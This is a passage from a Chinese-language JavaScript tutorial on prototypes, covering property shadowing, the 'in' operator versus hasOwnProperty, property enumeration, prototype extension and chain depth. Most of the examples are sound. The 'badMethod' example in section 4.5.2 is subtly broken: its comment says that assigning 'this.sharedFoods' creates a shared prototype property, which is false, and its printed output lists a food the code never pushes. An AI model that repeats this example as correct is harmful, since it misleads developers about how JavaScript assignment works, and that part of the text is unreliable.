<span class="hljs-title class_">TestPrototype</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">method3</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>.<span class="hljs-property">length</span>; };
<span class="hljs-title class_">TestPrototype</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">method4</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">2</span>); };
<span class="hljs-title class_">TestPrototype</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">method5</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">''</span>).<span class="hljs-title function_">reverse</span>().<span class="hljs-title function_">join</span>(<span class="hljs-string">''</span>); };

<span class="hljs-comment">// 内存占用测试</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"=== 内存占用对比 ==="</span>);

<span class="hljs-keyword">const</span> count = <span class="hljs-number">10000</span>;
<span class="hljs-keyword">let</span> memoryConstructor = <span class="hljs-number">0</span>;
<span class="hljs-keyword">let</span> memoryPrototype = <span class="hljs-number">0</span>;

<span class="hljs-comment">// 估算：每个函数对象约1KB，每个字符串属性约0.1KB</span>
<span class="hljs-comment">// 构造函数模式：10000实例 × (5个方法 × 1KB + 1个属性 × 0.1KB) ≈ 51000KB ≈ 49.8MB</span>
<span class="hljs-comment">// 原型模式：10000实例 × (1个属性 × 0.1KB) + 5个方法 × 1KB ≈ 1005KB ≈ 0.98MB</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`创建<span class="hljs-subst">${count}</span>个实例的理论内存占用：`</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`构造函数模式：约 <span class="hljs-subst">${(count * (<span class="hljs-number">5</span> * <span class="hljs-number">1024</span> + <span class="hljs-number">102</span>) / <span class="hljs-number">1024</span> / <span class="hljs-number">1024</span>).toFixed(<span class="hljs-number">1</span>)}</span>MB`</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`原型模式：约 <span class="hljs-subst">${((count * <span class="hljs-number">102</span> + <span class="hljs-number">5</span> * <span class="hljs-number">1024</span>) / <span class="hljs-number">1024</span> / <span class="hljs-number">1024</span>).toFixed(<span class="hljs-number">1</span>)}</span>MB`</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`节约：约 <span class="hljs-subst">${((count * <span class="hljs-number">5</span> * <span class="hljs-number">1024</span>) / <span class="hljs-number">1024</span> / <span class="hljs-number">1024</span>).toFixed(<span class="hljs-number">1</span>)}</span>MB`</span>);

<span class="hljs-comment">// 实际测试</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\n=== 实际创建时间测试 ==="</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">"构造函数模式"</span>);
<span class="hljs-keyword">const</span> consInstances = [];
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; count; i++) {
    consInstances.<span class="hljs-title function_">push</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestConstructor</span>(<span class="hljs-string">`实例<span class="hljs-subst">${i}</span>`</span>));
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">"构造函数模式"</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">"原型模式"</span>);
<span class="hljs-keyword">const</span> protoInstances = [];
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; count; i++) {
    protoInstances.<span class="hljs-title function_">push</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestPrototype</span>(<span class="hljs-string">`实例<span class="hljs-subst">${i}</span>`</span>));
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">"原型模式"</span>);
</code></pre>
<h3 data-id="heading-38">4.4 属性访问的优先级和查找</h3>
<h4 data-id="heading-39">4.4.1 属性遮蔽（Property Shadowing）</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">type</span> = <span class="hljs-string">"普通猫"</span>;
<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">color</span> = <span class="hljs-string">"未知"</span>;

<span class="hljs-keyword">const</span> cat = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"咪咪"</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"=== 属性遮蔽实验 ==="</span>);

<span class="hljs-comment">// 1. 初始状态：访问原型属性</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"初始 - cat.type:"</span>, cat.<span class="hljs-property">type</span>);          <span class="hljs-comment">// "普通猫"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"初始 - cat.color:"</span>, cat.<span class="hljs-property">color</span>);        <span class="hljs-comment">// "未知"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"初始 - cat.hasOwnProperty('type'):"</span>, cat.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">"type"</span>));  <span class="hljs-comment">// false</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"初始 - cat.hasOwnProperty('color'):"</span>, cat.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">"color"</span>)); <span class="hljs-comment">// false</span>

<span class="hljs-comment">// 2. 在实例上添加同名属性（遮蔽）</span>
cat.<span class="hljs-property">type</span> = <span class="hljs-string">"超级猫"</span>;
cat.<span class="hljs-property">color</span> = <span class="hljs-string">"白色"</span>;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\n遮蔽后 - cat.type:"</span>, cat.<span class="hljs-property">type</span>);          <span class="hljs-comment">// "超级猫"（实例属性）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"遮蔽后 - cat.color:"</span>, cat.<span class="hljs-property">color</span>);          <span class="hljs-comment">// "白色"（实例属性）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"遮蔽后 - cat.hasOwnProperty('type'):"</span>, cat.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">"type"</span>));  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"遮蔽后 - cat.hasOwnProperty('color'):"</span>, cat.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">"color"</span>)); <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 3. 原型属性仍然存在</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\n原型属性 - Cat.prototype.type:"</span>, <span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">type</span>);  <span class="hljs-comment">// "普通猫"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"原型属性 - Cat.prototype.color:"</span>, <span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">color</span>);  <span class="hljs-comment">// "未知"</span>

<span class="hljs-comment">// 4. 删除实例属性（解除遮蔽）</span>
<span class="hljs-keyword">delete</span> cat.<span class="hljs-property">type</span>;
<span class="hljs-keyword">delete</span> cat.<span class="hljs-property">color</span>;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\n删除后 - cat.type:"</span>, cat.<span class="hljs-property">type</span>);          <span class="hljs-comment">// "普通猫"（又访问到原型）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"删除后 - cat.color:"</span>, cat.<span class="hljs-property">color</span>);          <span class="hljs-comment">// "未知"（又访问到原型）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"删除后 - cat.hasOwnProperty('type'):"</span>, cat.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">"type"</span>));  <span class="hljs-comment">// false</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"删除后 - cat.hasOwnProperty('color'):"</span>, cat.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">"color"</span>)); <span class="hljs-comment">// false</span>
</code></pre>
<h4 data-id="heading-40">4.4.2 <code>in</code> 操作符 vs <code>hasOwnProperty</code></h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">species</span> = <span class="hljs-string">"猫"</span>;

<span class="hljs-keyword">const</span> cat = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"咪咪"</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"=== in 和 hasOwnProperty 的区别 ==="</span>);

<span class="hljs-comment">// 1. hasOwnProperty：只检查对象自身属性</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"cat.hasOwnProperty('name'):"</span>, cat.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">"name"</span>));     <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"cat.hasOwnProperty('species'):"</span>, cat.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">"species"</span>)); <span class="hljs-comment">// false</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"cat.hasOwnProperty('toString'):"</span>, cat.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">"toString"</span>)); <span class="hljs-comment">// false</span>

<span class="hljs-comment">// 2. in 操作符：检查整个原型链</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\n'name' in cat:"</span>, <span class="hljs-string">"name"</span> <span class="hljs-keyword">in</span> cat);         <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"'species' in cat:"</span>, <span class="hljs-string">"species"</span> <span class="hljs-keyword">in</span> cat);     <span class="hljs-comment">// true（在原型链上找到）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"'toString' in cat:"</span>, <span class="hljs-string">"toString"</span> <span class="hljs-keyword">in</span> cat);   <span class="hljs-comment">// true（在Object.prototype上）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"'notExist' in cat:"</span>, <span class="hljs-string">"notExist"</span> <span class="hljs-keyword">in</span> cat);   <span class="hljs-comment">// false</span>

<span class="hljs-comment">// 3. 实用函数：区分自身属性和继承属性</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getPropertySource</span>(<span class="hljs-params">obj, prop</span>) {
    <span class="hljs-keyword">if</span> (obj.<span class="hljs-title function_">hasOwnProperty</span>(prop)) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"自身属性"</span>;
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (prop <span class="hljs-keyword">in</span> obj) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"原型链继承"</span>;
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"不存在"</span>;
    }
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\n属性来源分析："</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"name:"</span>, <span class="hljs-title function_">getPropertySource</span>(cat, <span class="hljs-string">"name"</span>));       <span class="hljs-comment">// 自身属性</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"species:"</span>, <span class="hljs-title function_">getPropertySource</span>(cat, <span class="hljs-string">"species"</span>)); <span class="hljs-comment">// 原型链继承</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"toString:"</span>, <span class="hljs-title function_">getPropertySource</span>(cat, <span class="hljs-string">"toString"</span>)); <span class="hljs-comment">// 原型链继承</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"age:"</span>, <span class="hljs-title function_">getPropertySource</span>(cat, <span class="hljs-string">"age"</span>));         <span class="hljs-comment">// 不存在</span>
</code></pre>
<h4 data-id="heading-41">4.4.3 遍历属性的不同方法</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name, color</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span> = color;
}

<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">species</span> = <span class="hljs-string">"猫"</span>;
<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">eat</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {};

<span class="hljs-comment">// 在原型链上添加不可枚举属性</span>
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>, <span class="hljs-string">"hidden"</span>, {
    <span class="hljs-attr">value</span>: <span class="hljs-string">"隐藏属性"</span>,
    <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span>
});

<span class="hljs-keyword">const</span> cat = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"咪咪"</span>, <span class="hljs-string">"白色"</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"=== 不同遍历方法的区别 ==="</span>);

<span class="hljs-comment">// 1. for...in：遍历所有可枚举属性（包括原型链）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"for...in 遍历："</span>);
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> cat) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`  <span class="hljs-subst">${key}</span>: <span class="hljs-subst">${cat[key]}</span>`</span>);
}
<span class="hljs-comment">// 输出：</span>
<span class="hljs-comment">//   name: 咪咪</span>
<span class="hljs-comment">//   color: 白色</span>
<span class="hljs-comment">//   species: 猫</span>
<span class="hljs-comment">//   eat: function() {}</span>

<span class="hljs-comment">// 2. Object.keys()：只遍历自身可枚举属性</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\nObject.keys()："</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(cat)); <span class="hljs-comment">// ["name", "color"]</span>

<span class="hljs-comment">// 3. Object.getOwnPropertyNames()：自身所有属性（包括不可枚举）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\nObject.getOwnPropertyNames()："</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyNames</span>(cat)); <span class="hljs-comment">// ["name", "color"]</span>

<span class="hljs-comment">// 4. 获取所有属性（包括原型链的）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getAllProperties</span>(<span class="hljs-params">obj</span>) {
    <span class="hljs-keyword">const</span> props = {};
    
    <span class="hljs-comment">// 遍历原型链</span>
    <span class="hljs-keyword">let</span> current = obj;
    <span class="hljs-keyword">while</span> (current &amp;&amp; current !== <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>) {
        <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyNames</span>(current).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">prop</span> =&gt;</span> {
            <span class="hljs-keyword">if</span> (!props[prop] &amp;&amp; prop !== <span class="hljs-string">"constructor"</span>) {
                props[prop] = {
                    <span class="hljs-attr">value</span>: current[prop],
                    <span class="hljs-attr">own</span>: current === obj,
                    <span class="hljs-attr">enumerable</span>: <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyDescriptor</span>(current, prop).<span class="hljs-property">enumerable</span>
                };
            }
        });
        current = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(current);
    }
    
    <span class="hljs-keyword">return</span> props;
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\n所有属性分析："</span>);
<span class="hljs-keyword">const</span> allProps = <span class="hljs-title function_">getAllProperties</span>(cat);
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> prop <span class="hljs-keyword">in</span> allProps) {
    <span class="hljs-keyword">const</span> info = allProps[prop];
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${prop}</span>: <span class="hljs-subst">${info.own ? <span class="hljs-string">"自身"</span> : <span class="hljs-string">"继承"</span>}</span> <span class="hljs-subst">${info.enumerable ? <span class="hljs-string">"可枚举"</span> : <span class="hljs-string">"不可枚举"</span>}</span>`</span>);
}
</code></pre>
<h3 data-id="heading-42">4.5 原型模式的最佳实践</h3>
<h4 data-id="heading-43">4.5.1 安全的原型扩展</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 不安全的写法：直接覆盖prototype</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-comment">// ❌ 不推荐：完全覆盖prototype，丢失constructor</span>
<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = {
    <span class="hljs-attr">eat</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在吃东西"</span>);
    }
};

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>().<span class="hljs-property">constructor</span>); <span class="hljs-comment">// Object，不是Cat！</span>

<span class="hljs-comment">// ✅ 推荐写法1：逐个添加</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">eat</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在吃东西"</span>);
};

<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sleep</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在睡觉"</span>);
};

<span class="hljs-comment">// ✅ 推荐写法2：使用Object.assign，但保留constructor</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>, {
    <span class="hljs-comment">// 显式设置constructor</span>
    <span class="hljs-attr">constructor</span>: <span class="hljs-title class_">Cat</span>,
    
    <span class="hljs-attr">eat</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在吃东西"</span>);
    },
    
    <span class="hljs-attr">sleep</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在睡觉"</span>);
    }
});

<span class="hljs-comment">// ✅ 推荐写法3：使用class（ES6）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> {
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    }
    
    <span class="hljs-title function_">eat</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在吃东西"</span>);
    }
    
    <span class="hljs-title function_">sleep</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在睡觉"</span>);
    }
}
</code></pre>
<h4 data-id="heading-44">4.5.2 原型方法的注意事项</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">foods</span> = []; <span class="hljs-comment">// 引用类型属性</span>
}

<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = {
    <span class="hljs-attr">constructor</span>: <span class="hljs-title class_">Cat</span>,
    
    <span class="hljs-comment">// ✅ 正确：使用this访问实例属性</span>
    <span class="hljs-attr">eat</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">food</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在吃"</span> + food);
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">foods</span>.<span class="hljs-title function_">push</span>(food);
    },
    
    <span class="hljs-comment">// ❌ 危险：在原型方法中修改共享状态</span>
    <span class="hljs-attr">badMethod</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-comment">// 如果访问Cat.prototype上的属性，会影响到所有实例！</span>
        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">sharedFoods</span>) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">sharedFoods</span> = []; <span class="hljs-comment">// 这会在原型上创建属性！</span>
        }
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">sharedFoods</span>.<span class="hljs-title function_">push</span>(<span class="hljs-string">"鱼"</span>);
    },
    
    <span class="hljs-comment">// ✅ 正确：使用闭包创建私有变量</span>
    <span class="hljs-attr">getCounter</span>: (<span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">let</span> privateCounter = <span class="hljs-number">0</span>;
        
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
            privateCounter++;
            <span class="hljs-keyword">return</span> privateCounter;
        };
    })()
};

<span class="hljs-keyword">const</span> cat1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"猫1"</span>);
<span class="hljs-keyword">const</span> cat2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"猫2"</span>);

cat1.<span class="hljs-title function_">eat</span>(<span class="hljs-string">"鱼"</span>);
cat2.<span class="hljs-title function_">eat</span>(<span class="hljs-string">"肉"</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat1.<span class="hljs-property">foods</span>); <span class="hljs-comment">// ["鱼"]</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat2.<span class="hljs-property">foods</span>); <span class="hljs-comment">// ["肉"]</span>

cat1.<span class="hljs-title function_">badMethod</span>();
cat2.<span class="hljs-title function_">badMethod</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat1.<span class="hljs-property">sharedFoods</span>); <span class="hljs-comment">// ["鱼", "肉"] </span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat2.<span class="hljs-property">sharedFoods</span>); <span class="hljs-comment">// ["鱼", "肉"] </span>
<span class="hljs-comment">// 注意：sharedFoods实际上在原型上，两个实例共享！</span>
</code></pre>
<h4 data-id="heading-45">4.5.3 原型链的深度控制</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 原型链不宜过深，一般建议不超过3层</span>
<span class="hljs-comment">// 猫 → 动物 → 生物 → Object.prototype → null （5层，已较深）</span>

<span class="hljs-comment">// 过深原型链的性能问题</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">"创建深层原型链"</span>);
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Level1</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Level2</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Level3</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Level4</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Level5</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Level6</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Level7</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Level8</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Level9</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Level10</span>(<span class="hljs-params"/>) {}

<span class="hljs-title class_">Level2</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Level1</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Level3</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Level2</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Level4</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Level3</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Level5</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Level4</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Level6</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Level5</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Level7</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Level6</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
